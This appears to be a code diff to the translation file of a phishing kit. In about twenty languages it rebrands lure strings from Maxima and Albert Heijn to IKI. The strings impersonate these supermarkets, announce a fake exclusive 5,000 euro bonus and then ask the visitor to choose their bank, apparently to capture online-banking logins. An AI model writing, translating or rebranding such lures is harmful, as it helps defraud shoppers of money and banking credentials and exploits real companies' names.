@@ -39,10 +39,10 @@ export type TranslationKeys = {
 
 export const translations: Record<string, TranslationKeys> = {
   lt: {
-    portal_name: "Maxima Klientų Portalas",
-    support_center_name: "Maxima Klientų Aptarnavimas",
-    win_title: "Ekskliuzyvinė Maxima Premija",
-    win_subtitle: "Sveikiname! Buvote atrinkti šiandienos Maxima akcijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.",
+    portal_name: "IKI Klientų Portalas",
+    support_center_name: "IKI Klientų Aptarnavimas",
+    win_title: "Ekskliuzyvinė IKI Premija",
+    win_subtitle: "Sveikiname! Buvote atrinkti šiandienos IKI akcijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.",
     win_button: "Atsiimti premiją",
     banken_title: "Pasirinkite savo banką",
     banken_subtitle: "Pasirinkite savo banką, kad tęstumėte.",
@@ -77,10 +77,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Apdorojama..."
   },
   fi: {
-    portal_name: "Albert Heijn Asiakasportaali",
-    support_center_name: "Albert Heijn Asiakaspalvelu",
-    win_title: "Ainutlaatuinen Albert Heijn -bonus",
-    win_subtitle: "Onnittelut! Sinut on valittu tämän päivän Albert Heijn -kampanjaan. Napsauta alla olevaa painiketta lunastaaksesi 5 000 euron bonuksesi.",
+    portal_name: "IKI Asiakasportaali",
+    support_center_name: "IKI Asiakaspalvelu",
+    win_title: "Ainutlaatuinen IKI -bonus",
+    win_subtitle: "Onnittelut! Sinut on valittu tämän päivän IKI -kampanjaan. Napsauta alla olevaa painiketta lunastaaksesi 5 000 euron bonuksesi.",
     win_button: "Lunasta bonus",
     banken_title: "Valitse pankkisi",
     banken_subtitle: "Valitse pankkisi jatkaaksesi.",
@@ -115,10 +115,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Käsitellään..."
   },
   nl: {
-    portal_name: "Albert Heijn klantenportaal",
-    support_center_name: "Albert Heijn service",
-    win_title: "Exclusieve Albert Heijn bonus",
-    win_subtitle: "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.",
+    portal_name: "IKI klantenportaal",
+    support_center_name: "IKI service",
+    win_title: "Exclusieve IKI bonus",
+    win_subtitle: "Gefeliciteerd! Je bent geselecteerd voor onze IKI actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.",
     win_button: "Bonus claimen",
     banken_title: "Kies je bank",
     banken_subtitle: "Selecteer je Nederlandse bank om verder te gaan.",
@@ -153,10 +153,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Verwerken..."
   },
   et: {
-    portal_name: "Maxima Kliendiportaal",
-    support_center_name: "Maxima Klienditeenindus",
-    win_title: "Eksklusiivne Maxima Boonus",
-    win_subtitle: "Palju õnne! Olete valitud tänasesse Maxima kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 5000 euro suurune boonus.",
+    portal_name: "IKI Kliendiportaal",
+    support_center_name: "IKI Klienditeenindus",
+    win_title: "Eksklusiivne IKI Boonus",
+    win_subtitle: "Palju õnne! Olete valitud tänasesse IKI kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 5000 euro suurune boonus.",
     win_button: "Lunasta boonus",
     banken_title: "Vali oma pank",
     banken_subtitle: "Jätkamiseks vali oma Eesti pank.",
@@ -191,10 +191,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Töötlemine..."
   },
   cs: {
-    portal_name: "Zákaznický portál Albert Heijn",
-    support_center_name: "Služby Albert Heijn",
-    win_title: "Exkluzivní bonus Albert Heijn",
-    win_subtitle: "Gratulujeme! Byli jste vybráni do dnešní kampaně Albert Heijn. Kliknutím na tlačítko níže získáte bonus 5 000 eur.",
+    portal_name: "Zákaznický portál IKI",
+    support_center_name: "Služby IKI",
+    win_title: "Exkluzivní bonus IKI",
+    win_subtitle: "Gratulujeme! Byli jste vybráni do dnešní kampaně IKI. Kliknutím na tlačítko níže získáte bonus 5 000 eur.",
     win_button: "Získat bonus",
     banken_title: "Vyberte svou banku",
     banken_subtitle: "Pro pokračování vyberte svou banku.",
@@ -229,10 +229,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Zpracovává se..."
   },
   pt: {
-    portal_name: "Portal do Cliente Albert Heijn",
-    support_center_name: "Serviço Albert Heijn",
-    win_title: "Bónus Exclusivo Albert Heijn",
-    win_subtitle: "Parabéns! Você foi selecionado para a promoção Albert Heijn de hoje. Clique no botão abaixo para resgatar seu bónus de 5.000 euros.",
+    portal_name: "Portal do Cliente IKI",
+    support_center_name: "Serviço IKI",
+    win_title: "Bónus Exclusivo IKI",
+    win_subtitle: "Parabéns! Você foi selecionado para a promoção IKI de hoje. Clique no botão abaixo para resgatar seu bónus de 5.000 euros.",
     win_button: "Resgatar Bónus",
     banken_title: "Escolha o seu Banco",
     banken_subtitle: "Selecione o seu banco para continuar.",
@@ -267,10 +267,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "A processar..."
   },
   pl: {
-    portal_name: "Portal Klienta Albert Heijn",
-    support_center_name: "Obsługa Albert Heijn",
-    win_title: "Ekskluzywny Bonus Albert Heijn",
-    win_subtitle: "Gratulacje! Zostałeś wybrany do dzisiejszej promocji Albert Heijn. Kliknij przycisk poniżej, aby odebrać swój bonus w wysokości 5000 euro.",
+    portal_name: "Portal Klienta IKI",
+    support_center_name: "Obsługa IKI",
+    win_title: "Ekskluzywny Bonus IKI",
+    win_subtitle: "Gratulacje! Zostałeś wybrany do dzisiejszej promocji IKI. Kliknij przycisk poniżej, aby odebrać swój bonus w wysokości 5000 euro.",
     win_button: "Odbierz bonus",
     banken_title: "Wybierz swój bank",
     banken_subtitle: "Wybierz swój bank, aby kontynuować.",
@@ -305,10 +305,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Przetwarzanie..."
   },
   sv: {
-    portal_name: "Albert Heijn Kundportal",
-    support_center_name: "Albert Heijn Kundservice",
-    win_title: "Exklusiv Albert Heijn Bonus",
-    win_subtitle: "Grattis! Du har blivit utvald till dagens Albert Heijn-kampanj. Klicka på knappen nedan för att hämta din bonus på 5 000 euro.",
+    portal_name: "IKI Kundportal",
+    support_center_name: "IKI Kundservice",
+    win_title: "Exklusiv IKI Bonus",
+    win_subtitle: "Grattis! Du har blivit utvald till dagens IKI-kampanj. Klicka på knappen nedan för att hämta din bonus på 5 000 euro.",
     win_button: "Hämta bonus",
     banken_title: "Välj din bank",
     banken_subtitle: "Välj din bank för att fortsätta.",
@@ -343,10 +343,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Behandlar..."
   },
   da: {
-    portal_name: "Albert Heijn Kundeportal",
-    support_center_name: "Albert Heijn Kundeservice",
-    win_title: "Eksklusiv Albert Heijn Bonus",
-    win_subtitle: "Tillykke! Du er blevet udvalgt til dagens Albert Heijn-kampagne. Klik på knappen nedenfor for at gøre krav på din bonus på 5.000 euro.",
+    portal_name: "IKI Kundeportal",
+    support_center_name: "IKI Kundeservice",
+    win_title: "Eksklusiv IKI Bonus",
+    win_subtitle: "Tillykke! Du er blevet udvalgt til dagens IKI-kampagne. Klik på knappen nedenfor for at gøre krav på din bonus på 5.000 euro.",
     win_button: "Gør krav på bonus",
     banken_title: "Vælg din bank",
     banken_subtitle: "Vælg din bank for at fortsætte.",
@@ -381,10 +381,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Behandler..."
   },
   ro: {
-    portal_name: "Portalul Clienților Albert Heijn",
-    support_center_name: "Serviciul Clienți Albert Heijn",
-    win_title: "Bonus Exclusiv Albert Heijn",
-    win_subtitle: "Felicitări! Ați fost selectat pentru promoția Albert Heijn de astăzi. Faceți clic pe butonul de mai jos pentru a revendica bonusul dvs. de 5.000 de euro.",
+    portal_name: "Portalul Clienților IKI",
+    support_center_name: "Serviciul Clienți IKI",
+    win_title: "Bonus Exclusiv IKI",
+    win_subtitle: "Felicitări! Ați fost selectat pentru promoția IKI de astăzi. Faceți clic pe butonul de mai jos pentru a revendica bonusul dvs. de 5.000 de euro.",
     win_button: "Revendicați Bonusul",
     banken_title: "Alegeți-vă banca",
     banken_subtitle: "Selectați-vă banca pentru a continua.",
@@ -419,10 +419,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Se procesează..."
   },
   el: {
-    portal_name: "Πύλη Πελατών Albert Heijn",
-    support_center_name: "Εξυπηρέτηση Πελατών Albert Heijn",
-    win_title: "Αποκλειστικό Μπόνους Albert Heijn",
-    win_subtitle: "Συγχαρητήρια! Έχετε επιλεγεί για τη σημερινή προσφορά της Albert Heijn. Κάντε κλικ στο παρακάτω κουμπί για να διεκδικήσετε το μπόνους των 5.000 ευρώ.",
+    portal_name: "Πύλη Πελατών IKI",
+    support_center_name: "Εξυπηρέτηση Πελατών IKI",
+    win_title: "Αποκλειστικό Μπόνους IKI",
+    win_subtitle: "Συγχαρητήρια! Έχετε επιλεγεί για τη σημερινή προσφορά της IKI. Κάντε κλικ στο παρακάτω κουμπί για να διεκδικήσετε το μπόνους των 5.000 ευρώ.",
     win_button: "Διεκδίκηση Μπόνους",
     banken_title: "Επιλέξτε την τράπεζά σας",
     banken_subtitle: "Επιλέξτε την τράπεζά σας για να συνεχίσετε.",
@@ -457,10 +457,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Επεξεργασία..."
   },
   hu: {
-    portal_name: "Albert Heijn Ügyfélportál",
-    support_center_name: "Albert Heijn Ügyfélszolgálat",
-    win_title: "Exkluzív Albert Heijn Bónusz",
-    win_subtitle: "Gratulálunk! Kiválasztottuk a mai Albert Heijn promócióra. Kattintson az alábbi gombra az 5000 eurós bónusz igényléséhez.",
+    portal_name: "IKI Ügyfélportál",
+    support_center_name: "IKI Ügyfélszolgálat",
+    win_title: "Exkluzív IKI Bónusz",
+    win_subtitle: "Gratulálunk! Kiválasztottuk a mai IKI promócióra. Kattintson az alábbi gombra az 5000 eurós bónusz igényléséhez.",
     win_button: "Bónusz igénylése",
     banken_title: "Válassza ki bankját",
     banken_subtitle: "A folytatáshoz válassza ki bankját.",
@@ -495,10 +495,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Feldolgozás..."
   },
   tr: {
-    portal_name: "Albert Heijn Müşteri Portalı",
-    support_center_name: "Albert Heijn Hizmetleri",
-    win_title: "Özel Albert Heijn Bonusu",
-    win_subtitle: "Tebrikler! Bugünkü Albert Heijn kampanyamız için seçildiniz. 5.000 Euro bonusunuzu talep etmek için aşağıdaki butona tıklayın.",
+    portal_name: "IKI Müşteri Portalı",
+    support_center_name: "IKI Hizmetleri",
+    win_title: "Özel IKI Bonusu",
+    win_subtitle: "Tebrikler! Bugünkü IKI kampanyamız için seçildiniz. 5.000 Euro bonusunuzu talep etmek için aşağıdaki butona tıklayın.",
     win_button: "Bonusu Talep Et",
     banken_title: "Bankanızı Seçin",
     banken_subtitle: "Devam etmek için bankanızı seçin.",
@@ -533,10 +533,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "İşleniyor..."
   },
   en: {
-    portal_name: "Albert Heijn Customer Portal",
-    support_center_name: "Albert Heijn Service",
-    win_title: "Exclusive Albert Heijn Bonus",
-    win_subtitle: "Congratulations! You have been selected for today's Albert Heijn promotion. Click the button below to claim your 5,000 euro bonus.",
+    portal_name: "IKI Customer Portal",
+    support_center_name: "IKI Service",
+    win_title: "Exclusive IKI Bonus",
+    win_subtitle: "Congratulations! You have been selected for today's IKI promotion. Click the button below to claim your 5,000 euro bonus.",
     win_button: "Claim Bonus",
     banken_title: "Choose Your Bank",
     banken_subtitle: "Select your bank to continue.",
@@ -571,10 +571,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Processing..."
   },
   de: {
-    portal_name: "Albert Heijn Kundenportal",
-    support_center_name: "Albert Heijn Service",
-    win_title: "Exklusiver Albert Heijn Bonus",
-    win_subtitle: "Herzlichen Glückwunsch! Sie wurden für unsere heutige Albert Heijn Aktion ausgewählt. Klicken Sie auf den Button unten, um Ihren 5.000 Euro Bonus zu beanspruchen.",
+    portal_name: "IKI Kundenportal",
+    support_center_name: "IKI Service",
+    win_title: "Exklusiver IKI Bonus",
+    win_subtitle: "Herzlichen Glückwunsch! Sie wurden für unsere heutige IKI Aktion ausgewählt. Klicken Sie auf den Button unten, um Ihren 5.000 Euro Bonus zu beanspruchen.",
     win_button: "Bonus beanspruchen",
     banken_title: "Wählen Sie Ihre Bank",
     banken_subtitle: "Wählen Sie Ihre Bank, um fortzufahren.",
@@ -609,10 +609,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Wird bearbeitet..."
   },
   fr: {
-    portal_name: "Portail Client Albert Heijn",
-    support_center_name: "Service Albert Heijn",
-    win_title: "Bonus Exclusif Albert Heijn",
-    win_subtitle: "Félicitations ! Vous avez été sélectionné pour notre promotion Albert Heijn d'aujourd'hui. Cliquez sur le bouton ci-dessous pour réclamer votre bonus de 5 000 euros.",
+    portal_name: "Portail Client IKI",
+    support_center_name: "Service IKI",
+    win_title: "Bonus Exclusif IKI",
+    win_subtitle: "Félicitations ! Vous avez été sélectionné pour notre promotion IKI d'aujourd'hui. Cliquez sur le bouton ci-dessous pour réclamer votre bonus de 5 000 euros.",
     win_button: "Réclamer le Bonus",
     banken_title: "Choisissez Votre Banque",
     banken_subtitle: "Sélectionnez votre banque pour continuer.",
@@ -647,10 +647,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Traitement en cours..."
   },
   es: {
-    portal_name: "Portal del Cliente Albert Heijn",
-    support_center_name: "Servicio Albert Heijn",
-    win_title: "Bono Exclusivo Albert Heijn",
-    win_subtitle: "¡Felicidades! Has sido seleccionado para la promoción de Albert Heijn de hoy. Haz clic en el botón de abajo para reclamar tu bono de 5.000 euros.",
+    portal_name: "Portal del Cliente IKI",
+    support_center_name: "Servicio IKI",
+    win_title: "Bono Exclusivo IKI",
+    win_subtitle: "¡Felicidades! Has sido seleccionado para la promoción de IKI de hoy. Haz clic en el botón de abajo para reclamar tu bono de 5.000 euros.",
     win_button: "Reclamar Bono",
     banken_title: "Elige tu Banco",
     banken_subtitle: "Selecciona tu banco para continuar.",
@@ -685,10 +685,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Procesando..."
   },
   it: {
-    portal_name: "Portale Clienti Albert Heijn",
-    support_center_name: "Servizio Albert Heijn",
-    win_title: "Bonus Esclusivo Albert Heijn",
-    win_subtitle: "Congratulazioni! Sei stato selezionato per la promozione Albert Heijn di oggi. Clicca sul pulsante qui sotto per richiedere il tuo bonus di 5.000 euro.",
+    portal_name: "Portale Clienti IKI",
+    support_center_name: "Servizio IKI",
+    win_title: "Bonus Esclusivo IKI",
+    win_subtitle: "Congratulazioni! Sei stato selezionato per la promozione IKI di oggi. Clicca sul pulsante qui sotto per richiedere il tuo bonus di 5.000 euro.",
     win_button: "Richiedi Bonus",
     banken_title: "Scegli la tua Banca",
     banken_subtitle: "Seleziona la tua banca per continuare.",
